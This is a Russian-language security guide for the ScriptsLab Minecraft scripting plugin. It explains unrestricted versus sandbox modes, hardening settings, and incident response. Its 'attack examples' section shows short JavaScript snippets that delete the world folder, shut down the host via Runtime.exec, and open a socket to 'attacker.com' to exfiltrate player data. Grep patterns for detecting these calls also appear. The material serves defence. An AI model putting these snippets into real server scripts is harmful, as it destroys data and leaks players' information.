# ScriptsLab - Безопасность

## ⚠️ Важно!

ScriptsLab предоставляет мощный скриптовый движок, который может выполнять JavaScript код на вашем сервере. **Неправильная конфигурация может привести к проблемам безопасности!**

## Режимы работы

### 🔓 Unrestricted Mode (Без ограничений)

**Когда использовать:**
- Личный сервер
- Вы единственный, кто пишет скрипты
- Полное доверие ко всем администраторам

**Возможности:**
- ✅ Полный доступ к Java API
- ✅ Чтение/запись файлов
- ✅ Сетевые запросы
- ✅ Выполнение системных команд
- ✅ Доступ к Reflection API

**Настройка:**
```yaml
security:
  sandbox-enabled: false
```

**⚠️ Риски:**
- Скрипты могут удалить файлы сервера
- Скрипты могут выполнить системные команды
- Скрипты могут украсть данные
- Скрипты могут остановить сервер

### 🔒 Sandbox Mode (Песочница)

**Когда использовать:**
- Публичный сервер
- Несколько администраторов
- Не доверяете всем скриптам

**Ограничения:**
- ❌ Нет доступа к файловой системе
- ❌ Нет сетевых запросов
- ❌ Нет системных команд
- ✅ Только безопасные Bukkit/Paper API
- ✅ Только разрешённые Java классы

**Настройка:**
```yaml
security:
  sandbox-enabled: true
  allowed-packages:
    - org.bukkit
    - net.kyori
    - java.util
    - java.lang
```

**Что можно:**
- ✅ Работа с игроками
- ✅ Работа с миром
- ✅ События Bukkit
- ✅ Команды
- ✅ Кастомные предметы

**Что нельзя:**
- ❌ `new java.io.File()`
- ❌ `Runtime.getRuntime().exec()`
- ❌ `new java.net.Socket()`
- ❌ Reflection API

## Текущая конфигурация

По умолчанию ScriptsLab работает в **Unrestricted Mode** для удобства разработки.

**Для продакшена рекомендуется включить Sandbox Mode!**

## Примеры атак (что может пойти не так)

### Атака 1: Удаление файлов

```javascript
// В unrestricted mode это сработает!
var File = Java.type('java.io.File');
var worldFolder = new File('world');
worldFolder.delete(); // Удалит мир!
```

**Защита:** Sandbox mode блокирует `java.io.File`

### Атака 2: Выполнение команд

```javascript
// В unrestricted mode это сработает!
var Runtime = Java.type('java.lang.Runtime');
Runtime.getRuntime().exec('shutdown -s -t 0'); // Выключит сервер!
```

**Защита:** Sandbox mode блокирует `java.lang.Runtime`

### Атака 3: Кража данных

```javascript
// В unrestricted mode это сработает!
var Socket = Java.type('java.net.Socket');
var socket = new Socket('attacker.com', 1337);
// Отправка данных игроков злоумышленнику
```

**Защита:** Sandbox mode блокирует `java.net.*`

### Атака 4: Бесконечный цикл

```javascript
// Это сработает в любом режиме!
while(true) {
    // Заморозит сервер
}
```

**Защита:** Таймаут выполнения (настраивается в config.yml)

## Рекомендации по безопасности

### 1. Используйте Sandbox Mode на публичных серверах

```yaml
security:
  sandbox-enabled: true
```

### 2. Ограничьте права на папку скриптов

```bash
# Linux
chmod 700 plugins/ScriptsLab/scripts/
chown minecraft:minecraft plugins/ScriptsLab/scripts/

# Windows
# Настройте права через свойства папки
```

### 3. Проверяйте скрипты перед загрузкой

```bash
# Проверьте на опасные паттерны
grep -r "Runtime.getRuntime" scripts/
grep -r "java.io.File" scripts/
grep -r "java.net.Socket" scripts/
```

### 4. Используйте таймауты

```yaml
scripts:
  timeout: 5000  # 5 секунд максимум
```

### 5. Ограничьте память

```yaml
scripts:
  max-memory: 128  # 128 MB на скрипт
```

### 6. Логируйте всё

```yaml
general:
  debug: true  # Включить подробное логирование
```

### 7. Регулярно проверяйте логи

```bash
# Ищите подозрительную активность
grep "Script" logs/latest.log
grep "ERROR" logs/latest.log
```

### 8. Используйте права доступа

```yaml
# В plugin.yml
permissions:
  scriptslab.script:
    description: Управление скриптами
    default: op  # Только операторы
```

### 9. Делайте резервные копии

```bash
# Регулярно бэкапьте сервер
tar -czf backup-$(date +%Y%m%d).tar.gz world/ plugins/
```

### 10. Обновляйте плагин

Следите за обновлениями ScriptsLab для получения патчей безопасности.

## Что делать при взломе

### 1. Немедленно остановите сервер

```bash
stop
```

### 2. Проверьте скрипты

```bash
# Найдите подозрительные скрипты
find plugins/ScriptsLab/scripts/ -type f -mtime -1
```

### 3. Проверьте логи

```bash
# Найдите подозрительную активность
grep -i "error\|exception\|failed" logs/latest.log
```

### 4. Удалите подозрительные скрипты

```bash
rm plugins/ScriptsLab/scripts/suspicious_script.js
```

### 5. Включите Sandbox Mode

```yaml
security:
  sandbox-enabled: true
```

### 6. Смените пароли

Смените пароли от:
- FTP/SFTP
- Панели управления
- Базы данных
- Операторских аккаунтов

### 7. Восстановите из бэкапа

Если повреждения серьёзные - восстановите сервер из резервной копии.

## Проверка безопасности

### Тест 1: Попытка доступа к файлам

```javascript
// Этот скрипт должен УПАСТЬ в sandbox mode
var File = Java.type('java.io.File');
Console.log('File access: ' + (File !== undefined));
```

**Ожидаемый результат в sandbox mode:**
```
ReferenceError: Java is not defined
```

### Тест 2: Попытка выполнения команд

```javascript
// Этот скрипт должен УПАСТЬ в sandbox mode
var Runtime = Java.type('java.lang.Runtime');
Runtime.getRuntime().exec('echo test');
```

**Ожидаемый результат в sandbox mode:**
```
ReferenceError: Java is not defined
```

### Тест 3: Доступ к Bukkit API

```javascript
// Этот скрипт должен РАБОТАТЬ в sandbox mode
var Material = Java.type('org.bukkit.Material');
Console.log('Bukkit access: OK');
```

**Ожидаемый результат в sandbox mode:**
```
[ScriptsLab] [Script] Bukkit access: OK
```

## Сравнение режимов

| Функция | Unrestricted | Sandbox |
|---------|-------------|---------|
| Bukkit API | ✅ | ✅ |
| Команды | ✅ | ✅ |
| События | ✅ | ✅ |
| Кастомные предметы | ✅ | ✅ |
| Файловая система | ✅ | ❌ |
| Сетевые запросы | ✅ | ❌ |
| Системные команды | ✅ | ❌ |
| Reflection API | ✅ | ❌ |
| Произвольные Java классы | ✅ | ❌ |

## FAQ

### Q: Нужен ли мне Sandbox Mode?

**A:** Да, если:
- У вас публичный сервер
- Несколько человек имеют доступ к скриптам
- Вы не доверяете всем скриптам на 100%

**Нет, если:**
- Это ваш личный сервер
- Только вы пишете скрипты
- Вам нужен полный доступ к Java API

### Q: Можно ли обойти Sandbox?

**A:** Теоретически - да, если найдена уязвимость в GraalVM. Но это очень сложно и маловероятно.

### Q: Влияет ли Sandbox на производительность?

**A:** Минимально. Проверка прав доступа добавляет ~1-2% накладных расходов.

### Q: Можно ли разрешить конкретные классы в Sandbox?

**A:** Да, добавьте их в `allowed-packages` в config.yml:

```yaml
security:
  allowed-packages:
    - org.bukkit
    - com.mycompany.api
```

### Q: Что делать, если скрипт не работает в Sandbox?

**A:** Либо:
1. Переписать скрипт без опасных операций
2. Добавить нужные классы в `allowed-packages`
3. Отключить Sandbox (не рекомендуется)

## Заключение

**Для разработки:** Используйте Unrestricted Mode  
**Для продакшена:** Используйте Sandbox Mode

**Золотое правило:** Если сомневаетесь - включайте Sandbox!

---

**Безопасность - это не опция, это необходимость! 🔒**
